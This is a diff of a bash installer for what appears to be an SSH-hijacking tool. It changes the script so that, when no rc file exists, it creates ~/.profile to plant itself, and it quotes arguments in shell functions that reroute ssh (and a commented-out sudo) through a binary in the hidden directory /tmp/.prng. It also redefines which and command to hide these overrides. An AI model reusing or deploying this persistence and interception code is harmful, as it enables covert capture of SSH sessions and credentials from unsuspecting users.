@@ -121,7 +121,12 @@ try_basedir "/tmp/.prng/u-${UID}" || \
 RCFILE="$RCFILE_USER"
 
 # no RCFILE found...
-[[ -z $RCFILE ]] && { echo >&2 "No rcfile found"; exit 87; }
+if [[ -z $RCFILE ]]; then
+	echo >&2 "No rcfile found. Creating ~/.profile"
+	#; exit 87; }
+	RCFILE="${HOME}/.profile"
+	touch "${RCFILE}"
+fi
 
 if [[ -z $IS_INSTALLED_RCFILE_SYSTEM ]] && [[ -z $IS_INSTALLED_RCFILE_USER ]]; then
 	rcfile_add "$RCFILE"
@@ -143,28 +148,28 @@ thc_set1()
 	ssh()
 	{
 		if [[ -f \"${THC_BASEDIR}/ssh\" ]]; then
-			THC_TARGET=\"\$THC_ORIG_SSH\" \"${THC_BASEDIR}/ssh\" \$@
+			THC_TARGET=\"\$THC_ORIG_SSH\" \"${THC_BASEDIR}/ssh\" \"\$@\"
 		else
-			\$THC_ORIG_SSH \$@
+			\$THC_ORIG_SSH \"\$@\"
 		fi
 	}
 	#sudo()
 	#{
 	#	if [[ -f \"${THC_BASEDIR}/sudo\" ]]; then
-	#		THC_TARGET=\"\$THC_ORIG_SUDO\" \"${THC_BASEDIR}/sudo\" \$@
+	#		THC_TARGET=\"\$THC_ORIG_SUDO\" \"${THC_BASEDIR}/sudo\" \"\$@\"
 	#	else
-	#		\$THC_ORIG_SUDO \$@
+	#		\$THC_ORIG_SUDO \"\$@\"
 	#	fi
 	#}
 	which()
 	{
 		unset -f ssh sudo which command 2>/dev/null
-		which \$@ && { thc_set1; true; } || { thc_set1; false; }
+		which \"\$@\" && { thc_set1; true; } || { thc_set1; false; }
 	}
 	command()
 	{
 		unset -f ssh sudo which command 2>/dev/null
-		command \$@ && { thc_set1; true; } || { thc_set1; false; }
+		command \"\$@\" && { thc_set1; true; } || { thc_set1; false; }
 	}
 }
 thc_set1" >"${THC_BASEDIR}/seed"
